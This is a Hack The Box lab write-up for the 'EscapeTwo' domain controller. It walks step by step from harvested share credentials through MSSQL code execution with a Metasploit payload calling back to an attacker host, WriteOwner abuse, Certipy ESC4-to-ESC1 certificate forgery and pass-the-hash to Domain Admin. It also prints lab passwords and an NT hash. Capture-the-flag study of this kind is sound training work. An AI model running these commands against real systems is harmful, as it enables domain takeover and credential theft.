---
title: Escape_two
date: 2026-09-22 13:06:36
tags: HTB Active directory
---

**Machine:** EscapeTwo
**OS:** Windows Server 2019 (Domain Controller)
**Domain:** `sequel.htb`
**Difficulty:** Medium
**Focus:** Active Directory / ADCS (ESC4 → ESC1)

EscapeTwo is a solid medium-difficulty AD box that chains together some of the most common misconfigurations you'll see in real engagements: creds leaking from Office files on a share, a weak MSSQL `sa` password, a config file with plaintext creds, an abusable `WriteOwner` ACL, and finally an ADCS template that's vulnerable to ESC4. None of these are exotic on their own — the fun part is stringing them together into a full domain compromise.

---

## 1. Recon

Kicked things off with the usual full TCP Nmap scan:

```
Nmap scan report for 10.129.27.37
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Nothing surprising — this is a textbook Domain Controller fingerprint. Kerberos, LDAP, SMB, WinRM, and a bonus: **MSSQL on 1433**. That last one is usually worth a closer look on these boxes.

- Hostname: `DC01`
- Domain: `sequel.htb`

---

## 2. Initial Credential Access

The box ships with a set of starting creds:

```
rose : KxEPkKe6R8su
```

These worked fine over both SMB and LDAP, so I used them as a foothold to start enumerating the domain properly.

### AS-REP Roasting — no luck

```bash
impacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip 10.129.27.37 sequel.htb/rose:'KxEPkKe6R8su' -format hashcat -request
```

No accounts had `UF_DONT_REQUIRE_PREAUTH` set, so this route was a dead end.

### Kerberoasting — two accounts of interest

```bash
impacket-GetUserSPNs sequel.htb/rose:'KxEPkKe6R8su' -dc-ip 10.129.27.37
```

| ServicePrincipalName    | Account |
|--------------------------|---------|
| sequel.htb/sql_svc.DC01  | sql_svc |
| sequel.htb/ca_svc.DC01   | ca_svc  |

Both hashes came back crackable-looking, but cracking wasn't actually the path forward here — the real gold was sitting on a file share.

### SMB Share Enumeration

Rose had read access to the **Accounting Department** share, and inside were a handful of Excel spreadsheets that, unsurprisingly, still had plaintext credentials sitting in them:

| First Name | Last Name | Email             | Username | Password           |
|------------|-----------|-------------------|----------|---------------------|
| Angela     | Martin    | angela@sequel.htb | angela   | 0fwz7Q4mSpurIt99    |
| Oscar      | Martinez  | oscar@sequel.htb  | oscar    | 86LxLBMgEWaKUnBG    |
| Kevin      | Malone    | kevin@sequel.htb  | kevin    | Md9Wlq1E5bZnVDVo    |
| —          | —         | sa@sequel.htb     | sa       | MSSQLP@ssw0rd!      |

A quick spray against SMB/LDAP/MSSQL turned up two hits:

- **oscar : 86LxLBMgEWaKUnBG** → valid over SMB + LDAP
- **sa : MSSQLP@ssw0rd!** → valid local auth on MSSQL, and holding **sysadmin**

`sa` with sysadmin on a domain-joined SQL box is basically a guaranteed shell.

---

## 3. Initial Foothold — MSSQL to `sql_svc`

Confirmed the sysadmin role before doing anything else:

```bash
nxc mssql 10.129.27.37 -u sa -p 'MSSQLP@ssw0rd!' --local-auth -q "SELECT IS_SRVROLEMEMBER('sysadmin');"
# → 1
```

With sysadmin confirmed, xp_cmdshell (or in this case, Metasploit's MSSQL payload module) gets you code execution:

```
msf > use exploit/windows/mssql/mssql_payload
msf > set RHOSTS 10.129.27.37
msf > set PASSWORD MSSQLP@ssw0rd!
msf > set LHOST <attacker-ip>
msf > exploit
```

Session landed as **sql_svc** — a service account, but a foothold on the box nonetheless.

---

## 4. Local Enumeration & Credential Discovery

Poking around the filesystem, the SQL Server install left its configuration file readable:

```
C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
```

Inside was the service account password in plaintext:

```ini
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```

That password turned out to be reused — it authenticates for both `sql_svc` and, more interestingly, the domain user **ryan**. Password reuse between a service account and a real domain user is exactly the kind of thing you want to check for on every engagement.

---

## 5. Domain Enumeration with BloodHound

With a foothold and a fresh set of creds, it was time to map out the domain's ACLs. Dropped SharpHound onto the box via the `sql_svc` session:

```powershell
SharpHound.exe -c All
```

Pulled the resulting zip back and loaded it into BloodHound. The standout finding:

> **ryan** has **WriteOwner** rights over the **ca_svc** account.

That's the whole game right there — `WriteOwner` on an account means you can take ownership of it, grant yourself rights, and reset its password.

---

## 6. Taking Ownership of `ca_svc`

Abused the `WriteOwner` edge in three steps: take ownership, grant `FullControl`, then reset the password.

```bash
net rpc password "ca_svc" 'Password123!' -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "DC01.sequel.htb"
```

This is where the box's name-drop pays off — `ca_svc` is a member of **Cert Publishers**, which puts the AD Certificate Services attack surface directly in reach.

---

## 7. ADCS Abuse — ESC4 → ESC1

Certificate Services misconfigurations are one of the most reliable domain-privesc paths in modern AD environments, and this box has a classic one. Started by enumerating templates with Certipy:

```bash
certipy find -u 'ca_svc@sequel.htb' -p 'Password123!' -dc-ip 10.129.27.37 -vulnerable -stdout
```

That flagged the **DunderMifflinAuthentication** template as vulnerable:

- Has the Client Authentication EKU
- **Cert Publishers** holds Full Control / WriteOwner / WriteDACL over the template → classic **ESC4**

ESC4 means we can control the template's configuration directly — so the move is to modify it into something that behaves like an ESC1 template (i.e., one that lets the enrollee specify an arbitrary subject name).

### Modify the template

```bash
certipy template -u 'ca_svc@sequel.htb' -p 'Password123!' \
  -dc-ip 10.129.27.37 \
  -template DunderMifflinAuthentication \
  -write-configuration fixed.json
```

### Request a certificate as Domain Admin

With the template reconfigured, request a certificate while specifying the Administrator's UPN as the subject:

```bash
certipy req -u 'ca_svc@sequel.htb' -p 'Password123!' \
  -dc-ip 10.129.27.37 \
  -ca 'sequel-DC01-CA' \
  -template DunderMifflinAuthentication \
  -upn 'Administrator@sequel.htb'
```

### Authenticate with the certificate

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.27.37
```

Certipy performs PKINIT under the hood and hands back the NT hash for the Administrator account:

```
aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

---

## 8. Domain Admin

Pass-the-hash straight into WinRM:

```bash
evil-winrm -i 10.129.27.37 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

And that's full Domain Administrator on `sequel.htb`.

---

## Attack Path Summary

1. **rose** (given creds) → Accounting Department SMB share → plaintext creds in Excel files
2. **sa** (sysadmin on MSSQL) → Metasploit MSSQL payload → shell as **sql_svc**
3. SQL config file on disk → plaintext password reused by **ryan**
4. **ryan** has `WriteOwner` on **ca_svc** → take ownership → reset password
5. **ca_svc** is in **Cert Publishers** → ESC4 on the `DunderMifflinAuthentication` template
6. Reconfigure template (ESC4 → ESC1-style) → request a cert as Administrator
7. Authenticate with the certificate → NT hash → Domain Admin

## Techniques Demonstrated

- SMB share enumeration and credential harvesting from Office documents
- MSSQL abuse via `sa` / sysadmin → Metasploit payload for code execution
- Local file-based credential discovery (config files are always worth checking)
- BloodHound / SharpHound for ACL abuse path discovery
- `WriteOwner` abuse to hijack a service account
- ADCS ESC4 → ESC1 template reconfiguration
- Certificate-based (PKINIT) authentication for Domain Admin

**Takeaway:** almost nothing here required a fancy exploit — it was credential reuse, oversharing on file shares, and unaudited ACLs/certificate templates, chained together. That's most real-world AD compromises in a nutshell.